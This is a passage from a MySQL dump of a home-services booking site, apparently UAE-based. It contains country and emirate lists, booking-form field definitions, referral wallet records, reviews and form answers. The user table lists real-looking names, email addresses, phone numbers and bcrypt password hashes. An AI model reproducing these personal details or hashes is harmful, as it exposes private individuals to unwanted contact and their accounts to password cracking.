(520, 47, 'Lithuania'),
(521, 47, 'Luxembourg'),
(522, 47, 'Macau'),
(523, 47, 'Macedonia, The Former Yugoslav Republic of'),
(524, 47, 'Madagascar'),
(525, 47, 'Malawi'),
(526, 47, 'Malaysia'),
(527, 47, 'Maldives'),
(528, 47, 'Mali'),
(529, 47, 'Malta'),
(530, 47, 'Marshall Islands'),
(531, 47, 'Martinique'),
(532, 47, 'Mauritania'),
(533, 47, 'Mauritius'),
(534, 47, 'Mayotte'),
(535, 47, 'Mexico'),
(536, 47, 'Micronesia, Federated States of'),
(537, 47, 'Moldova, Republic of'),
(538, 47, 'Monaco'),
(539, 47, 'Mongolia'),
(540, 47, 'Montserrat'),
(541, 47, 'Morocco'),
(542, 47, 'Mozambique'),
(543, 47, 'Myanmar'),
(544, 47, 'Namibia'),
(545, 47, 'Nauru'),
(546, 47, 'Nepal'),
(547, 20, 'Other'),
(548, 47, 'Netherlands'),
(549, 47, 'Netherlands Antilles'),
(550, 47, 'New Caledonia'),
(551, 47, 'New Zealand'),
(552, 47, 'Nicaragua'),
(553, 47, 'Niger'),
(554, 47, 'Nigeria'),
(555, 47, 'Niue'),
(556, 47, 'Norfolk Island'),
(557, 47, 'Northern Mariana Islands'),
(558, 47, 'Norway'),
(559, 47, 'Oman'),
(560, 47, 'Pakistan'),
(561, 47, 'Palau'),
(562, 47, 'Panama'),
(563, 47, 'Papua New Guinea'),
(564, 47, 'Paraguay'),
(565, 47, 'Peru'),
(566, 47, 'Philippines'),
(567, 47, 'Pitcairn'),
(568, 47, 'Poland'),
(569, 47, 'Portugal'),
(570, 47, 'Puerto Rico'),
(571, 47, 'Qatar'),
(572, 47, 'Reunion'),
(573, 47, 'Romania'),
(574, 47, 'Russian Federation'),
(575, 47, 'Rwanda'),
(576, 47, 'Saint Kitts and Nevis'),
(577, 47, 'Saint Lucia'),
(578, 47, 'Saint Vincent and the Grenadines'),
(579, 47, 'Samoa'),
(580, 47, 'San Marino'),
(581, 47, 'Sao Tome and Principe'),
(582, 47, 'Saudi Arabia'),
(583, 47, 'Senegal'),
(584, 47, 'Seychelles'),
(585, 47, 'Sierra Leone'),
(586, 47, 'Singapore'),
(587, 47, 'Slovakia (Slovak Republic)'),
(588, 47, 'Slovenia'),
(589, 47, 'Solomon Islands'),
(590, 47, 'Somalia'),
(591, 47, 'South Africa'),
(592, 47, 'South Georgia and the South Sandwich Islands'),
(593, 47, 'Spain'),
(594, 47, 'Sri Lanka'),
(595, 47, 'St. Helena'),
(596, 47, 'St. Pierre and Miquelon'),
(597, 47, 'Sudan'),
(598, 47, 'Suriname'),
(599, 47, 'Svalbard and Jan Mayen Islands'),
(600, 47, 'Swaziland'),
(601, 47, 'Sweden'),
(602, 47, 'Switzerland'),
(603, 47, 'Syrian Arab Republic'),
(604, 47, 'Taiwan, Province of China'),
(605, 47, 'Tajikistan'),
(606, 47, 'Tanzania, United Republic of'),
(607, 47, 'Thailand'),
(608, 47, 'Togo'),
(609, 47, 'Tokelau'),
(610, 47, 'Tonga'),
(611, 47, 'Trinidad and Tobago'),
(612, 47, 'Tunisia'),
(613, 47, 'Turkey'),
(614, 47, 'Turkmenistan'),
(615, 47, 'Turks and Caicos Islands'),
(616, 47, 'Tuvalu'),
(617, 47, 'Uganda'),
(618, 47, 'Ukraine'),
(619, 47, 'United Arab Emirates'),
(620, 47, 'United Kingdom'),
(621, 47, 'United States'),
(622, 47, 'United States Minor Outlying Islands'),
(623, 47, 'Uruguay'),
(624, 47, 'Uzbekistan'),
(625, 47, 'Vanuatu'),
(626, 47, 'Venezuela'),
(627, 47, 'Vietnam'),
(628, 47, 'Virgin Islands (British)'),
(629, 47, 'Virgin Islands (U.S.)'),
(630, 47, 'Wallis and Futuna Islands'),
(631, 47, 'Western Sahara'),
(632, 47, 'Yemen'),
(633, 47, 'Yugoslavia'),
(634, 47, 'Zambia'),
(635, 47, 'Zimbabwe'),
(636, 62, '8:00 AM - 8:30 AM'),
(637, 62, '9:00 AM - 9:30 AM'),
(638, 62, '10:00 AM - 10:30 AM'),
(639, 62, '11:00 AM - 11:30 AM'),
(640, 62, '12:00 PM - 12:30 PM'),
(641, 62, '1:00 PM - 1:30 PM'),
(642, 62, '2:00 PM - 2:30 PM'),
(643, 62, '3:00 PM - 3:30 PM'),
(644, 62, '4:00 PM - 4:30 PM'),
(645, 62, '5:00 PM - 5:30 PM'),
(646, 62, '6:00 PM - 6:30 PM'),
(647, 62, '7:00 PM - 7:30 PM'),
(648, 39, 'Sharjah'),
(649, 39, 'Ajman'),
(650, 39, 'Ras Al Khaimah'),
(651, 39, 'Umm Al Quwain'),
(652, 39, 'Fujairah'),
(653, 40, 'Sharjah'),
(654, 40, 'Ajman'),
(655, 40, 'Ras Al Khaimah'),
(656, 40, 'Umm Al Quwain'),
(657, 40, 'Fujairah'),
(658, 63, 'Apartment'),
(659, 63, 'Villa');

-- --------------------------------------------------------

--
-- Table structure for table `form_fileds`
--

CREATE TABLE `form_fileds` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `lable_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` int(11) NOT NULL,
  `set_order` int(11) NOT NULL,
  `is_active` int(11) DEFAULT NULL,
  `mail_send` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `form_fileds`
--

INSERT INTO `form_fileds` (`id`, `lable_name`, `type`, `set_order`, `is_active`, `mail_send`, `created_at`, `updated_at`) VALUES
(17, 'Moving From', 2, 1, 1, 1, '2024-02-26 00:14:53', '2024-03-03 01:41:20'),
(18, 'Moving To', 2, 3, 1, 1, '2024-03-03 01:41:45', '2024-03-03 01:41:45'),
(19, 'Moving Area', 1, 3, 1, NULL, '2024-03-03 01:42:27', '2024-03-03 01:42:27'),
(20, 'Move Type', 2, 6, 1, 1, '2024-03-03 01:43:21', '2024-03-03 01:43:21'),
(21, 'Preffered Moving Date', 6, 7, 1, 1, '2024-03-03 01:43:39', '2024-03-03 01:43:39'),
(22, 'Specific Instructions', 5, 7, 0, NULL, '2024-03-03 01:43:55', '2024-03-03 01:43:55'),
(24, 'Do you have any specific checkbox', 4, 7, 1, NULL, '2024-03-13 00:07:11', '2024-03-13 00:07:11'),
(25, 'Please select the type of your storage', 2, 1, 1, 1, '2024-03-13 05:04:45', '2024-03-13 05:04:45'),
(26, 'When do you require the storage unit From ?', 6, 2, 1, 1, '2024-03-13 05:07:12', '2024-03-13 05:07:18'),
(27, 'When do you require the storage unit To?', 6, 3, 1, 1, '2024-03-13 05:07:35', '2024-03-13 05:07:35'),
(28, 'What would you like to store?', 4, 4, 1, NULL, '2024-03-13 05:09:35', '2024-03-13 05:09:35'),
(29, 'How much space do you require?', 2, 4, 1, NULL, '2024-03-13 05:11:21', '2024-03-13 05:11:21'),
(30, 'ZIP Code', 1, 6, 0, 0, '2024-03-13 05:12:10', '2024-03-13 05:12:10'),
(31, 'Do you require these additional services?', 7, 5, 0, NULL, '2024-03-13 05:12:44', '2024-05-30 04:57:14'),
(32, 'Do you have any specific instructions?', 5, 12, 0, NULL, '2024-03-13 05:13:07', '2024-03-13 06:04:54'),
(33, 'How many cleaners do you require?', 2, 1, 1, 0, '2024-03-13 05:14:14', '2024-03-13 05:14:14'),
(34, 'How many hours should they stay?', 2, 2, 1, 1, '2024-03-13 05:15:00', '2024-03-13 05:15:00'),
(35, 'How often do you need cleaning?', 2, 3, 1, 1, '2024-03-13 05:16:14', '2024-03-13 05:16:14'),
(36, 'Do you need additional cleaning materials', 3, 4, 1, 1, '2024-03-13 05:42:00', '2024-03-13 05:42:00'),
(37, 'How many carpets do you need cleaned?', 2, 1, 1, 1, '2024-03-13 05:59:06', '2024-03-13 05:59:06'),
(38, 'What type of cleaning do you need?', 3, 2, 1, 1, '2024-03-13 05:59:50', '2024-03-13 05:59:50'),
(39, 'Where are you moving from?', 2, 0, 1, 1, '2024-03-13 06:29:39', '2024-03-13 06:29:39'),
(40, 'Where are you moving to?', 2, 3, 1, 1, '2024-03-13 06:30:16', '2024-03-13 06:30:16'),
(41, 'When do you want to ship your vehicle?', 6, 6, 1, 1, '2024-03-13 06:30:45', '2024-03-13 06:30:45'),
(42, 'How many cars do you want to ship?', 2, 6, 1, 1, '2024-03-13 06:32:13', '2024-03-13 06:32:13'),
(43, 'Test-Radio', 3, 0, 1, 0, '2024-03-15 01:16:30', '2024-03-15 01:16:30'),
(44, 'Test-CheckBox', 4, 0, 1, NULL, '2024-03-15 01:59:53', '2024-03-15 01:59:53'),
(45, 'Moving From Area', 1, 2, 0, 1, '2024-03-16 05:04:13', '2024-03-16 05:04:13'),
(46, 'Moving To Area', 1, 5, 0, 1, '2024-03-16 05:04:26', '2024-03-16 05:04:26'),
(47, 'Moving To Country', 2, 3, 1, 1, '2024-03-16 05:08:03', '2024-03-16 05:08:03'),
(48, 'Moving To City', 1, 4, 1, 1, '2024-03-16 05:08:49', '2024-06-01 06:06:32'),
(50, 'Test', 2, 0, NULL, 0, '2024-03-21 04:00:49', '2024-03-21 04:00:49'),
(51, 'Test Mul Drop', 7, 0, 1, NULL, '2024-03-28 06:08:14', '2024-03-28 06:08:14'),
(52, 'test label devang', 2, 0, NULL, NULL, '2024-03-29 07:10:12', '2024-03-29 07:10:33'),
(53, 'Upload Images', 8, 0, 1, 1, '2024-03-29 23:59:02', '2024-03-29 23:59:02'),
(55, 'Time', 9, 0, 1, NULL, '2024-03-30 00:06:56', '2024-03-30 00:06:56'),
(57, 'Moving From?', 2, 0, 1, 1, '2024-04-03 05:36:12', '2024-04-03 05:37:23'),
(58, 'Please share a picture of your carpet', 8, 10, 1, 1, '2024-04-29 05:33:30', '2024-04-29 05:33:30'),
(59, 'Vehicle Details(Year, Make, Model)', 1, 7, NULL, NULL, '2024-05-01 05:54:44', '2024-06-08 00:18:45'),
(60, 'vehicle 2 details(Year, Make, Model)', 1, 8, NULL, NULL, '2024-05-01 05:55:02', '2024-05-01 05:55:02'),
(61, 'Which day would you like us to come?', 6, 10, 1, 1, '2024-06-01 02:07:03', '2024-06-01 02:07:56'),
(62, 'What time would you like us to arrive?', 2, 11, 1, 1, '2024-06-01 02:12:11', '2024-06-01 02:12:11'),
(63, 'Move Type?', 2, 6, NULL, NULL, '2024-06-19 05:21:49', '2024-06-19 05:21:49'),
(64, 'vehicle 3 details(Year, Make, Model)', 1, 9, NULL, NULL, '2024-06-22 00:49:52', '2024-06-22 00:49:52'),
(65, 'vehicle 4 details(Year, Make, Model)', 1, 10, NULL, NULL, '2024-06-22 00:50:01', '2024-06-22 00:50:01'),
(66, 'vehicle 5 details(Year, Make, Model)', 1, 11, NULL, NULL, '2024-06-22 00:50:10', '2024-06-22 00:50:10');

-- --------------------------------------------------------

--
-- Table structure for table `frontloginregisters`
--

CREATE TABLE `frontloginregisters` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `refer_id` int(11) DEFAULT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `mobile` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` int(11) NOT NULL COMMENT '0-inactive,1-active',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `frontloginregisters`
--

INSERT INTO `frontloginregisters` (`id`, `refer_id`, `name`, `email`, `password`, `mobile`, `status`, `created_at`, `updated_at`) VALUES
(1, NULL, 'devang', 'devang@gmail.com', '$2y$10$zInnAgKUEzptWx70BSUbiumhCCtHLBaY0VZXk4AQ6f9WWrBWbRVtm', '9033259413', 0, '2023-11-30 01:48:21', '2023-11-30 01:48:21'),
(2, NULL, 'mayudin', 'mayudin@gmail.com', '$2y$10$JKhVDmXhfpNwJ1ykbcLpCu0fv1Z/WnjCZvTCr9ELt6cWDCcSn0AF6', '1234567890', 0, '2023-11-30 01:48:31', '2023-11-30 01:48:31'),
(3, NULL, 'devang', 'devang1@gmail.com', '$2y$10$K0Hlx3VJfelP6PdWJ4Vp6uVPKCncD/A1dxCaUCc28mnHxhYFFhEdS', '9033259413', 0, '2023-11-30 01:51:31', '2023-11-30 01:51:31'),
(4, NULL, 'ventesh', 'ventesh@gmail.com', '$2y$10$p8zFtmv22ogoE7pitCMRVeCbL3pRoMReuj1ijfF5bFNQOwCe6e5Nm', '1234567890', 0, '2023-11-30 07:37:42', '2023-11-30 07:37:42'),
(5, NULL, 'dev patel', 'dev@gmail.com', '$2y$10$vw3oG98vSz4XWdu2959UeOVhVVdsHURFsXP6RgioUH4R8ULE2fCpC', '9033259413', 1, '2023-11-30 07:44:55', '2023-11-30 07:44:55'),
(6, NULL, 'mayudin', 'mayudin.hnrtechnologies@gmail.com', '$2y$10$2W60WiD.yK1YEuJqpTBZauevrRxwzOxKBwEkN89CeGKtupuxH7yrS', '7990739286', 1, '2023-12-01 03:52:02', '2023-12-01 03:52:02'),
(7, NULL, 'ventesh', 'ventesh123@gmail.com', '$2y$10$Lyz.3e9T.M4KSBpIqINiiOsK5HJu6Ach8cetCL8FOJ4jorkGGl31u', '7897897899', 0, '2023-12-01 04:05:34', '2023-12-01 04:05:34'),
(8, NULL, 'Hitesh', 'hitesh@gmail.com', '$2y$10$clHW6VaQfq1jRuo7arLkcO0WU0nPWro5hn.teBLpc8IhU2sq8tvry', '1111111111', 0, '2023-12-01 06:37:58', '2023-12-01 06:37:58'),
(9, NULL, 'mayudin', 'mayudin123@gmail.com', '$2y$10$pEBO/vXHnbt8ye58JpxUA.ohkW0LN04AAJrDxNCk5mDLZNMa5.Lei', '7897897899', 1, '2023-12-20 00:15:54', '2023-12-20 00:15:54'),
(10, NULL, 'Nikul Patel', 'patelnikul321@gmail.com', '$2y$10$vWT0sUlgyRA7.9KV4HPxKOA0v9qwiYfMuDA7qBE8h8Q7HIHVT4hcK', '8097517477', 1, '2023-12-23 03:36:04', '2023-12-23 03:36:04'),
(11, NULL, 'Mayudin', 'mayudin1904@gmail.com', '$2y$10$swy2fU1KsRUoBwSxRZozdesI3G3Z5ZQpTN9vS8kf65eoBQ5zqOodG', '7990739286', 1, '2023-12-25 01:39:34', '2023-12-25 01:39:34'),
(12, 11, 'adb', 'adcb@gmail.com', '$2y$10$yxXNLRjnxE/zOyeVSpQLPusguehRrSpTaSqSjZGUFI1ffyhKa/goq', '1234567', 1, '2024-01-05 00:08:26', '2024-01-05 00:08:26'),
(13, NULL, 'Asmit Kaushik', 'asmit@digitalsadhus.com', '$2y$10$cLKR2Hv0fdfNoMYG1qxcQ.iEfKydfLIM5V9bigKNPG2IQz/VgkW1i', '9920651001', 1, '2024-01-09 06:55:22', '2024-01-09 06:55:22'),
(14, NULL, 'test', 'testadmin@gmail.com', '$2y$10$sSJeV.S6RbxDqpLQdNHiFuWmLM4kjW87D6wYoCSUvLYABjlf/l3Q.', '9033259413', 1, '2024-01-10 08:22:21', '2024-01-10 08:22:21'),
(15, NULL, 'testuserfront', 'testuserfront@gmail.com', '$2y$10$MOwzLYi0pjauFr7y6vZ7y.hKjS1XX7OQ3F2cmj5/KwbbjQRntntC2', '9033259413', 1, '2024-01-17 02:29:35', '2024-01-17 02:29:35'),
(16, NULL, 'Suhaan', 'suhaanmukadam007@gmail.com', '$2y$10$Hp0CAyJAbMWApPEFqCfk4upjiwS0Pt0N1V9n8tZWM.5IENiqaL.6S', '0585200722', 1, '2024-01-25 10:48:28', '2024-01-25 10:48:28'),
(17, 11, 'nikul', 'nikul@gmail.com', '$2y$10$KO5/t0slurbjvZkqzizJvO.bebM.qlonlUOtvkMvb1c00iuR2DNOq', '1234567', 1, '2024-01-26 04:08:31', '2024-01-26 04:08:31'),
(18, 17, 'ventesh', 'venteshd@gmail.com', '$2y$10$JmV2iHx2MA6JB.po8SQQpuNcXAxByZd1ULOx8DU9QO7.z6fHl/Fz.', '1234567', 1, '2024-01-26 04:14:04', '2024-01-26 04:14:04'),
(19, NULL, 'hitesh', 'devang.hnrtechnologies@gmail.com', '$2y$10$fk3jOaZuiMtiQ12PkuHDz.4Ov2yNSqLdAtgqWRfkcNkEA.bODVHzW', '9033259413', 1, '2024-02-06 07:39:29', '2024-02-06 07:39:29'),
(20, 11, 'adarsh', 'adars@gmail.com', '$2y$10$aPMvJ6znJ5a9cncUtZ1q5epY7HaqQNrfrc1izahc.jLwIDlGhf5xO', '1231234', 1, '2024-02-27 08:04:51', '2024-02-27 08:04:51'),
(21, NULL, 'Suhaan', 'suhaanmukadam16@gmail.com', '$2y$10$NfIf0rQx1ihS4E8He30YAenTcli6wbxFPq0YX4fzG3ZPn09pCEORC', '0585200722', 0, '2024-02-28 01:14:54', '2024-02-28 01:14:54'),
(22, NULL, 'Development PTBS', 'devsupport@purpletuche.com', '$2y$10$z96NYrxDl4z5/i.CEsDIJeMiPO4XjboC.8ygKCsKOHEpgo9wgNEZS', '', 1, '2024-03-16 04:59:11', '2024-03-16 04:59:11'),
(23, NULL, 'Ventesh Devendra', 'ventesh.hnrtechnologies@gmail.com', '$2y$10$1C9rNiFrFENpAVEfqxqttea9LgMUmW26fEgHGMxXlJhU5ud6w44t.', '', 1, '2024-03-16 05:37:50', '2024-03-16 05:37:50'),
(24, NULL, 'a', 'a@gmail.com', '$2y$10$1ZgwFd0dQ4qivTyAMHP2fesmacEVVsKwWOa249bnax2H.zqmd.2wK', '9595315214', 1, '2024-04-04 03:11:47', '2024-04-04 03:11:47'),
(25, 19, 'asmit', 'asmit@gmail.com', '$2y$10$qKpWy75uwyjFJIfCXXE2deCy2mTyXJE5A2JPz3XKLjJSXDpUOiWwO', '1234567890', 1, '2024-05-16 02:16:39', '2024-05-16 02:16:39'),
(26, NULL, 'Test', 'Test123@gmail.com', '$2y$10$5wJYy715Hh5ODJuF4HaO3O2FbvZcoueuAVLdexzKPvQSZPLJlzy66', '0585200722', 1, '2024-05-25 04:41:24', '2024-05-25 04:41:24'),
(27, NULL, 'SuhaanTest', 'suhaanmukadam@yahoo.com', '$2y$10$5mg.uOcugimpngiCQUTi9.YFBxNVFSESWkDDhhzCVXXAiShVtU.1G', '0585200722', 1, '2024-05-26 11:18:13', '2024-05-26 11:18:13'),
(28, NULL, 'Support VendorsCity', 'support@vendorscity.com', '$2y$10$zg1dYAixAtJFazysLmrhge.WXdapSho6NyzHt3Ee1J4rylZ/xs8Om', '', 1, '2024-05-27 06:34:00', '2024-05-27 06:34:00'),
(29, NULL, 'Rajnikant Patel', 'rajnikant.patel87@gmail.com', '$2y$10$7eJpiksnAJSwfGJEOzXULuSZ3R49JHeXVgHaOk5oTjKJftZoFs8Cu', '', 1, '2024-05-27 07:39:00', '2024-05-27 07:39:00'),
(32, NULL, 'Zafar', 'zafar@quickserverelo.com', '$2y$10$nCPHd5FPZzitj.ZrbsLH8.kSS9M2RpTY8fSiMVMLxlYP/bPKSjn72', '0508807610', 1, '2024-05-30 00:19:53', '2024-05-30 00:19:53'),
(33, NULL, 'Abhishek', 'abhishek.hnrtechnologies@gmail.com', '$2y$10$VsV.dYXiS1VevfOMtA.E1.DE0LyPmVYaMRZ2kzr4ZlsiFvfyUjs3G', '1234678905', 1, '2024-06-01 03:24:34', '2024-06-01 03:24:34'),
(34, NULL, 'adarsh', 'adarsh.hnrtechnologies@gmail.com', '$2y$10$dik3OjLFygajmnAN3wEgqOEcrIw86NkYOGQA7ECEDTMEstUNxZa42', '1234567890', 1, '2024-06-06 04:48:27', '2024-06-06 04:48:27'),
(35, NULL, 'krishnna w', 'krishnna.work@gmail.com', '$2y$10$CpmcaiNMax6t99GIm.w/..spYf4WjltTqQKR2iBTKhKbBV5mw/2gm', '', 1, '2024-06-11 10:14:42', '2024-06-11 10:14:42'),
(36, NULL, 'Zafar Mukadam', 'zafar.mukadam@gmail.com', '$2y$10$9pVbNVya5psfEk2SZrU/C.G/0CuR76g89fGUgqrCL1RJ8z9NBFpc6', '', 1, '2024-06-15 07:14:25', '2024-06-15 07:14:25'),
(37, NULL, 'Suhaan Mukadam', 'suhaan@vendorscity.com', '$2y$10$myT5/z7YVdeXxVgY95POrOR341ldpTG8C6J3MWnd/j2eqmX1Fly8G', '', 1, '2024-06-15 08:12:23', '2024-06-15 08:12:23');

-- --------------------------------------------------------

--
-- Table structure for table `front_user_wallet`
--

CREATE TABLE `front_user_wallet` (
  `id` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `refer_id` int(11) NOT NULL,
  `order_currency` varchar(255) NOT NULL,
  `order_total` varchar(255) NOT NULL,
  `system_percentage` int(11) DEFAULT NULL,
  `wallet_amount` int(11) DEFAULT '0',
  `added_from` int(11) NOT NULL DEFAULT '0' COMMENT '0 = ''Plus'',1 =''Minus''',
  `order_id` int(11) NOT NULL DEFAULT '0',
  `added_date` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `front_user_wallet`
--

INSERT INTO `front_user_wallet` (`id`, `userid`, `refer_id`, `order_currency`, `order_total`, `system_percentage`, `wallet_amount`, `added_from`, `order_id`, `added_date`) VALUES
(1, 12, 11, 'AED', '2470', 10, 247, 0, 0, '2024-01-05'),
(2, 12, 11, 'AED', '882', 10, 88, 0, 0, '2024-01-05'),
(3, 17, 11, 'AED', '134', 10, 13, 0, 0, '2024-01-26'),
(4, 18, 17, 'AED', '134', 10, 13, 0, 0, '2024-01-26'),
(5, 18, 17, 'AED', '134', 10, 13, 0, 0, '2024-01-29'),
(6, 18, 17, 'AED', '134', 10, 13, 0, 0, '2024-01-29'),
(7, 20, 11, 'AED', '772', 10, 77, 0, 0, '2024-02-27'),
(8, 25, 19, 'AED', '3197', 10, 320, 0, 0, '2024-05-16');

-- --------------------------------------------------------

--
-- Table structure for table `googlereviews`
--

CREATE TABLE `googlereviews` (
  `id` int(11) NOT NULL,
  `label` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `description` text COLLATE utf8_unicode_ci NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `updated_at` datetime NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `googlereviews`
--

INSERT INTO `googlereviews` (`id`, `label`, `description`, `name`, `updated_at`, `created_at`) VALUES
(1, '5', 'Highly recommended and excellent services.', 'Bhagya Lakshmi', '2024-06-01 11:28:41', '2024-05-21 08:38:18'),
(2, '5', 'Good response and quality service.', 'Praveen Kowshik', '2024-06-01 11:28:21', '2024-05-21 10:52:34'),
(3, '5', 'Excellent service. The cleaning service was excellent at a lower cost. Value for money.', 'Mahad Khan', '2024-05-27 07:53:36', '2024-05-21 10:58:03'),
(4, '5', 'Excellent service. Highly recommended.', 'Suman Amara', '2024-06-01 11:27:44', '2024-05-27 07:41:14');

-- --------------------------------------------------------

--
-- Table structure for table `leads`
--

CREATE TABLE `leads` (
  `id` bigint(20) NOT NULL,
  `name` varchar(255) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `mobile` bigint(20) NOT NULL,
  `service_id` int(11) DEFAULT NULL,
  `subservice_id` int(11) DEFAULT NULL,
  `price` bigint(20) DEFAULT NULL,
  `inquiry_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `accept_reject` int(11) NOT NULL COMMENT '(0=default,1=accept,2=accept)'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `leads`
--

INSERT INTO `leads` (`id`, `name`, `email`, `mobile`, `service_id`, `subservice_id`, `price`, `inquiry_date`, `accept_reject`) VALUES
(1, 'Ventesh', 'ventesh@gmail.com', 1234567890, 2, 9, 120, '2023-11-09 14:43:17', 1);

-- --------------------------------------------------------

--
-- Table structure for table `more_formfields_details`
--

CREATE TABLE `more_formfields_details` (
  `id` int(11) NOT NULL,
  `package_inquiry_id` int(11) NOT NULL,
  `form_field_id` varchar(255) DEFAULT NULL,
  `formfield_value` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `more_formfields_details`
--

INSERT INTO `more_formfields_details` (`id`, `package_inquiry_id`, `form_field_id`, `formfield_value`) VALUES
(1, 1, '1', NULL),
(2, 1, '2', NULL),
(3, 1, '3', NULL),
(4, 1, '4', NULL),
(5, 1, '6', NULL),
(6, 1, '7', NULL),
(7, 1, '8', NULL),
(8, 1, '14', NULL),
(9, 1, '2', 'Dubai'),
(10, 1, '3', 'Abu Dhabi'),
(11, 1, '4', '2023-12-28'),
(12, 1, '7', 'Social Media'),
(13, 1, '5', 'Handyman service,Move In / Out Painting service'),
(14, 2, '1', NULL),
(15, 2, '2', NULL),
(16, 2, '3', NULL),
(17, 2, '4', NULL),
(18, 2, '6', NULL),
(19, 2, '7', NULL),
(20, 2, '8', NULL),
(21, 2, '14', NULL),
(22, 2, '2', 'Dubai'),
(23, 2, '3', 'Abu Dhabi'),
(24, 2, '4', '2023-12-28'),
(25, 2, '7', 'Social Media'),
(26, 2, '5', 'Handyman service,Move In / Out Painting service'),
(27, 3, '1', 'Studio Apartment'),
(28, 3, '2', 'Dubai'),
(29, 3, '3', 'Abu Dhabi'),
(30, 3, '4', '2023-12-28'),
(31, 3, '6', '8045'),
(32, 3, '7', 'Social Media'),
(33, 3, '8', '8045'),
(34, 3, '14', 'test'),
(35, 3, '2', NULL),
(36, 3, '3', NULL),
(37, 3, '4', NULL),
(38, 3, '7', NULL),
(39, 3, '5', 'Handyman service,Move In / Out Painting service'),
(40, 4, '1', '1 BR Apartment'),
(41, 4, '2', 'Dubai'),
(42, 4, '6', NULL),
(43, 4, '3', 'Abu Dhabi'),
(44, 4, '7', 'Social Media'),
(45, 4, '4', '2024-01-11'),
(46, 4, '8', NULL),
(47, 4, '14', NULL),
(48, 4, '2', NULL),
(49, 4, '3', NULL),
(50, 4, '7', NULL),
(51, 4, '4', NULL),
(52, 4, '5', 'Handyman service,Move In / Out Painting service'),
(53, 5, '15', 'tst label'),
(54, 5, '2', 'Dubai'),
(55, 5, '6', 'no'),
(56, 5, '3', 'Sharjah'),
(57, 5, '4', '2024-01-27'),
(58, 6, '17', 'Dubai'),
(59, 6, '18', 'Dubai'),
(60, 6, '19', 'test'),
(61, 6, '20', 'Apartment'),
(62, 6, '21', '2024-03-12'),
(63, 6, '22', 'teest test'),
(64, 7, '17', 'Dubai'),
(65, 7, '18', 'Ajman'),
(66, 7, '19', 'tst label'),
(67, 7, '20', 'Apartment'),
(68, 7, '21', '2024-03-01'),
(69, 7, '22', 'Test'),
(70, 8, '17', 'Abu Dhabi'),
(71, 8, '18', 'Ajman'),
(72, 8, '19', 'tst label dev'),
(73, 8, '20', 'Villa'),
(74, 8, '21', '2024-03-01'),
(75, 8, '22', 'safads'),
(76, 9, '17', 'Sharjah'),
(77, 9, '18', 'Ajman'),
(78, 9, '19', 'tst label dev'),
(79, 9, '20', 'Villa'),
(80, 9, '21', '2024-03-16'),
(81, 9, '22', 'Test dev'),
(82, 10, '17', 'Dubai'),
(83, 10, '18', 'Ajman'),
(84, 10, '19', 'test'),
(85, 10, '20', 'Villa'),
(86, 10, '21', '2024-03-08'),
(87, 10, '22', 'test'),
(88, 11, '17', 'Dubai'),
(89, 11, '18', 'Dubai'),
(90, 11, '19', 'test'),
(91, 11, '20', 'Apartment'),
(92, 11, '21', '2024-03-23'),
(93, 11, '22', 'tesdd'),
(94, 12, '17', 'Abu Dhabi'),
(95, 12, '18', 'Dubai'),
(96, 12, '19', '123'),
(97, 12, '20', 'Apartment'),
(98, 12, '21', '2024-03-21'),
(99, 12, '22', 'testing'),
(100, 13, '17', 'Dubai'),
(101, 13, '18', 'Dubai'),
(102, 13, '19', 'tst label'),
(103, 13, '20', 'Apartment'),
(104, 13, '21', '2024-03-09'),
(105, 13, '22', '45'),
(106, 14, '17', 'Dubai'),
(107, 14, '18', 'Ajman'),
(108, 14, '19', '1500sq'),
(109, 14, '20', 'Apartment'),
(110, 14, '21', '2024-03-02'),
(111, 14, '22', 'Dev specification'),
(112, 15, '17', 'Abu Dhabi'),
(113, 15, '18', 'Dubai'),
(114, 15, '19', '1500sqdev'),
(115, 15, '20', 'Villa'),
(116, 15, '21', '2024-03-17'),
(117, 15, '22', '123'),
(118, 16, '17', 'Abu Dhabi'),
(119, 16, '18', 'Ajman'),
(120, 16, '19', 'tst label'),
(121, 16, '20', 'Apartment'),
(122, 16, '21', '2024-03-30'),
(123, 16, '22', 'wewe'),
(124, 17, '17', 'Abu Dhabi'),
(125, 17, '18', 'Dubai'),
(126, 17, '19', 'tst label dev'),
(127, 17, '20', 'Apartment'),
(128, 17, '21', '2024-03-09'),
(129, 17, '22', NULL),
(130, 18, '17', 'Abu Dhabi'),
(131, 18, '18', 'Dubai'),
(132, 18, '19', '123'),
(133, 18, '20', 'Apartment'),
(134, 18, '21', '2024-03-14'),
(135, 18, '22', 'tes'),
(136, 19, '17', 'Dubai'),
(137, 19, '18', 'Dubai'),
(138, 19, '19', 'sdds'),
(139, 19, '20', 'Villa'),
(140, 19, '21', '2024-03-02'),
(141, 19, '22', 'safaf'),
(142, 20, '17', 'Abu Dhabi'),
(143, 20, '18', 'Dubai'),
(144, 20, '19', 'tst label'),
(145, 20, '20', 'Villa'),
(146, 20, '21', '2024-03-02'),
